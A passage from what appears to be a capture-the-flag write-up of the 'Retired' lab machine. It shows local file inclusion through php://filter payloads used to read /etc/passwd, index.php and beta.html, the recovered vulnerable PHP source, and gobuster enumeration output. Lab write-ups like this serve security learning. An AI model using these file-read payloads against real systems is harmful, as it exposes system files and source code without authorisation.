<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">vagrant</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">::</span><span class="o">/</span><span class="n">vagrant</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">dev</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>With that knowledge, we can get the application source, i.e., index.php and other files, for further checking. We’ll use filters to encode the content, so PHP will not interpret it:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td>
<td class="rouge-code"><pre><span class="err">$</span> <span class="n">http</span> <span class="o">-</span><span class="n">v</span> <span class="sh">'</span><span class="s">http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php</span><span class="sh">'</span>
<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">index</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">retired</span><span class="p">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">HTTPie</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">0</span>

<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">02</span> <span class="n">Apr</span> <span class="mi">2022</span> <span class="mi">22</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">07</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>

<span class="n">PD9waHAKZnVuY3Rpb24gc2FuaXRpemVfaW5wdXQoJHBhcmFtKSB7CiAgICAkcGFyYW0xID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhcmFtKTsKICAgICRwYXJhbTIgPSBzdHJfcmVwbGFjZSgiLi8iLCIiLCRwYXJhbTEpOwogICAgcmV0dXJuICRwYXJhbTI7Cn0KCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKaWYgKGlzc2V0KCRwYWdlKSAmJiBwcmVnX21hdGNoKCIvXlthLXpdLyIsICRwYWdlKSkgewogICAgJHBhZ2UgPSBzYW5pdGl6ZV9pbnB1dCgkcGFnZSk7Cn0gZWxzZSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXgucGhwP3BhZ2U9ZGVmYXVsdC5odG1sJyk7Cn0KCnJlYWRmaWxlKCRwYWdlKTsKPz4K</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>And voila! We’ve got <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td>
<td class="rouge-code"><pre><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">function</span> <span class="nf">sanitize_input</span><span class="p">(</span><span class="err">$</span><span class="n">param</span><span class="p">)</span> <span class="p">{</span>
    <span class="err">$</span><span class="n">param1</span> <span class="o">=</span> <span class="nf">str_replace</span><span class="p">(</span><span class="sh">"</span><span class="s">../</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="err">$</span><span class="n">param</span><span class="p">);</span>
    <span class="err">$</span><span class="n">param2</span> <span class="o">=</span> <span class="nf">str_replace</span><span class="p">(</span><span class="sh">"</span><span class="s">./</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="err">$</span><span class="n">param1</span><span class="p">);</span>
    <span class="k">return</span> <span class="err">$</span><span class="n">param2</span><span class="p">;</span>
<span class="p">}</span>

<span class="err">$</span><span class="n">page</span> <span class="o">=</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="sh">'</span><span class="s">page</span><span class="sh">'</span><span class="p">];</span>
<span class="nf">if </span><span class="p">(</span><span class="nf">isset</span><span class="p">(</span><span class="err">$</span><span class="n">page</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">preg_match</span><span class="p">(</span><span class="sh">"</span><span class="s">/^[a-z]/</span><span class="sh">"</span><span class="p">,</span> <span class="err">$</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
    <span class="err">$</span><span class="n">page</span> <span class="o">=</span> <span class="nf">sanitize_input</span><span class="p">(</span><span class="err">$</span><span class="n">page</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nf">header</span><span class="p">(</span><span class="sh">'</span><span class="s">Location: /index.php?page=default.html</span><span class="sh">'</span><span class="p">);</span>
<span class="p">}</span>

<span class="nf">readfile</span><span class="p">(</span><span class="err">$</span><span class="n">page</span><span class="p">);</span>
<span class="err">?</span><span class="o">&gt;</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Let’s try something else and check for any hidden files or directories on that host. After some time with gobuster, we see a beta.html page:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td>
<td class="rouge-code"><pre><span class="err">$</span> <span class="n">gobuster</span> <span class="nb">dir</span> <span class="o">-</span><span class="n">x</span> <span class="n">txt</span><span class="p">,</span><span class="n">sql</span><span class="p">,</span><span class="n">bak</span><span class="p">,</span><span class="nb">zip</span><span class="p">,</span><span class="n">bz2</span><span class="p">,</span><span class="mi">7</span><span class="n">z</span><span class="p">,</span><span class="n">htm</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">js</span><span class="p">,</span><span class="n">php</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">retired</span><span class="p">.</span><span class="n">htb</span> 
<span class="o">===============================================================</span>
<span class="n">Gobuster</span> <span class="n">v3</span><span class="p">.</span><span class="mf">1.0</span>
<span class="n">by</span> <span class="n">OJ</span> <span class="nc">Reeves </span><span class="p">(</span><span class="nd">@TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="nc">Mehlmauer </span><span class="p">(</span><span class="nd">@firefart</span><span class="p">)</span>
<span class="o">===============================================================</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">retired</span><span class="p">.</span><span class="n">htb</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="n">txt</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.1</span><span class="p">.</span><span class="mi">0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Extensions</span><span class="p">:</span>              <span class="n">sql</span><span class="p">,</span><span class="n">bak</span><span class="p">,</span><span class="mi">7</span><span class="n">z</span><span class="p">,</span><span class="n">php</span><span class="p">,</span><span class="n">txt</span><span class="p">,</span><span class="nb">zip</span><span class="p">,</span><span class="n">bz2</span><span class="p">,</span><span class="n">htm</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">js</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
<span class="o">===============================================================</span>
<span class="mi">2022</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">02</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">31</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
<span class="o">===============================================================</span>
<span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php            </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">default</span><span class="p">.</span><span class="n">html</span><span class="p">]</span>
<span class="o">/</span><span class="n">default</span><span class="p">.</span><span class="nf">html         </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">11414</span><span class="p">]</span>                               
<span class="o">/</span><span class="nf">assets               </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">162</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">retired</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="nf">css                  </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">162</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">retired</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="p">]</span>   
<span class="o">/</span><span class="n">beta</span><span class="p">.</span><span class="nf">html            </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">4144</span><span class="p">]</span>                                   
<span class="o">/</span><span class="nf">js                   </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">162</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">retired</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="p">]</span>    
<span class="n">Progress</span><span class="p">:</span> <span class="mi">503294</span> <span class="o">/</span> <span class="mi">2426171</span> <span class="p">(</span><span class="mf">20.74</span><span class="o">%</span><span class="p">)</span>                                               <span class="o">^</span><span class="n">C</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Keyboard</span> <span class="n">interrupt</span> <span class="n">detected</span><span class="p">,</span> <span class="n">terminating</span><span class="p">.</span>
                                                                                   
<span class="o">===============================================================</span>
<span class="mi">2022</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">02</span> <span class="mi">19</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">43</span> <span class="n">Finished</span>
<span class="o">===============================================================</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>We can download it the same way as index.php:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td>
<td class="rouge-code"><pre><span class="err">$</span> <span class="n">http</span> <span class="o">-</span><span class="n">v</span> <span class="sh">'</span><span class="s">http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=beta.html</span><span class="sh">'</span>                                                                                                                
<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">beta</span><span class="p">.</span><span class="n">html</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">retired</span><span class="p">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">HTTPie</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">0</span>

<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">02</span> <span class="n">Apr</span> <span class="mi">2022</span> <span class="mi">19</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">07</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>

<span class="n">PCFET0NUWVBFIGh0bWw</span><span class="o">+</span><span class="n">CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5BZ2VuY3kgLSBTdGFydCBCb290c3RyYXAgVGhlbWU8L3RpdGxlPgogICAgICAgIDwhLS0gRmF2aWNvbi0tPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8</span><span class="o">+</span><span class="n">CiAgICAgICAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjE1LjMvanMvYWxsLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIEdvb2dsZSBmb250cy0tPgogICAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Nb250c2VycmF0OjQwMCw3MDAiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8</span><span class="o">+</span><span class="n">CiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M</span><span class="o">/</span><span class="n">ZmFtaWx5PVJvYm90bytTbGFiOjQwMCwxMDAsMzAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0</span><span class="o">+</span><span class="n">CiAgICAgICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICAgIDwvaGVhZD4KICAgIDxib2R5IGlkPSJwYWdlLXRvcCI</span><span class="o">+</span><span class="n">CiAgICAgICAgPCEtLSBNYXN0aGVhZC0tPgogICAgICAgIDxoZWFkZXIgY2xhc3M9Im1hc3RoZWFkIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLXN1YmhlYWRpbmciPldlbGNvbWUgVG8gT3VyIFN0dWRpbyE8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLWhlYWRpbmcgdGV4dC11cHBlcmNhc2UiPkl0J3MgTmljZSBUbyBNZWV0IFlvdTwvZGl2PgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBidG4teGwgdGV4dC11cHBlcmNhc2UiIGhyZWY9IiNzZXJ2aWNlcyI</span><span class="o">+</span><span class="n">VGVsbCBNZSBNb3JlPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2hlYWRlcj4KICAgICAgICA8IS0tIFNlcnZpY2VzLS0</span><span class="o">+</span><span class="n">CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2Utc2VjdGlvbiIgaWQ9ImJldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0ic2VjdGlvbi1oZWFkaW5nIHRleHQtdXBwZXJjYXNlIj5CZXRhIFRlc3RpbmcgUHJvZ3JhbSBmb3IgRU1VRU1VPC9oMj4KICAgICAgICAgICAgICAgICAgICBDdXJyZW50bHkgZGV2ZWxvcG1lbnQgZm9yIEVNVUVNVSBqdXN0IHN0YXJ0ZWQsIGJ1dCB3ZSBoYXZlIGJpZyBwbGFucy4KICAgICAgICAgICAgICAgICAgICBJZiB5b3UgYm91Z2h0IGFuIE9TVFJJQ0ggY29uc29sZSBmcm9tIHVzIGFuZCB3YW50IHdhbnQgdG8gYmUgcGFydCBvZiB0aGUgbmV4dCBzdGVwLAogICAgICAgICAgICAgICAgICAgIHlvdSBjYW4gZW5hYmxlIHlvdXIgT1NUUklDSCBsaWNlbnNlIGZvciB1c2FnZSB3aXRoIEVNVUVNVSB2aWEgdGhlIGFjdGl2YXRlX2xpY2Vuc2UgYXBwbGljYXRpb24gdG9kYXkKCQkgICAgZm9yIG91ciB1cGNvbWluZyBiZXRhIHRlc3RpbmcgcHJvZ3JhbSBmb3IgRU1VRU1VLjxici8</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICAgICAgQSBsaWNlbnNlIGZpbGVzIGNvbnRhaW5zIGEgNTEyIGJpdCBrZXkuIFRoYXQga2V5IGlzIGFsc28gaW4gdGhlIFFSIGNvZGUgY29udGFpbmVkIHdpdGhpbiB0aGUgT1NUUklDSCBwYWNrYWdlLgoJCSAgICBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgaW4gb3VyIGJldGEgdGVzdGluZyBwcm9ncmFtLgogICAgICAgICAgICAgICAgPC9kaXY</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImFjdGl2YXRlX2xpY2Vuc2UucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZvcm1GaWxlIiBjbGFzcz0iZm9ybS1sYWJlbCI</span><span class="o">+</span><span class="n">VXBsb2FkIExpY2Vuc2UgS2V5IEZpbGU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIGZvcm0tY29udHJvbC1sZyIgaWQ9ImZvcm1GaWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJsaWNlbnNlZmlsZSIvPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY</span><span class="o">+</span><span class="n">CiAgICAgICAgPC9zZWN0aW9uPgogICAgICAgIDwhLS0gRm9vdGVyLS0</span><span class="o">+</span><span class="n">CiAgICAgICAgPGZvb3RlciBjbGFzcz0iZm9vdGVyIHB5LTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGFsaWduLWl0ZW1zLWNlbnRlciI</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTQgdGV4dC1sZy1zdGFydCI</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vc3RhcnRib290c3RyYXAuY29tL3RoZW1lL2FnZW5jeSI</span><span class="o">+</span><span class="n">QWdlbmN5IEJvb3RzdHJhcCBUaGVtZTwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgcmVsZWFzZWQgdW5kZXIgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3N0YXJ0Ym9vdHN0cmFwL3N0YXJ0Ym9vdHN0cmFwLWFnZW5jeS9ibG9iL21hc3Rlci9MSUNFTlNFIj5NSVQgTGljZW5zZTwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCBteS0zIG15LWxnLTAiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1kYXJrIGJ0bi1zb2NpYWwgbXgtMiIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtdHdpdHRlciI</span><span class="o">+</span><span class="n">PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tc29jaWFsIG14LTIiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWZhY2Vib29rLWYiPjwvaT48L2E</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLXNvY2lhbCBteC0yIiBocmVmPSIjISI</span><span class="o">+</span><span class="n">PGkgY2xhc3M9ImZhYiBmYS1saW5rZWRpbi1pbiI</span><span class="o">+</span><span class="n">PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCB0ZXh0LWxnLWVuZCI</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWRhcmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgbWUtMyIgaHJlZj0iIyEiPlByaXZhY3kgUG9saWN5PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibGluay1kYXJrIHRleHQtZGVjb3JhdGlvbi1ub25lIiBocmVmPSIjISI</span><span class="o">+</span><span class="n">VGVybXMgb2YgVXNlPC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY</span><span class="o">+</span><span class="n">CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9vdGVyPgogICAgICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSlMtLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjAvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI</span><span class="o">+</span><span class="n">PC9zY3JpcHQ</span><span class="o">+</span><span class="n">CiAgICAgICAgPCEtLSBDb3JlIHRoZW1lIEpTLS0</span><span class="o">+</span><span class="n">CiAgICAgICAgPHNjcmlwdCBzcmM9ImpzL3NjcmlwdHMuanMiPjwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw</span><span class="o">+</span><span class="n">Cg</span><span class="o">==</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Inside that page is a web form that uses another file called <code class="language-plaintext highlighter-rouge">activate_licence.php</code> :</p>
<p><a href="/assets/img/htb/retired/form.png" class="popup img-link "><img data-src="/assets/img/htb/retired/form.png" alt="Form on a beta page" class="lazyload" data-proofer-ignore></a></p>
<p>So, again, let’s download it and check what’s inside:</p>
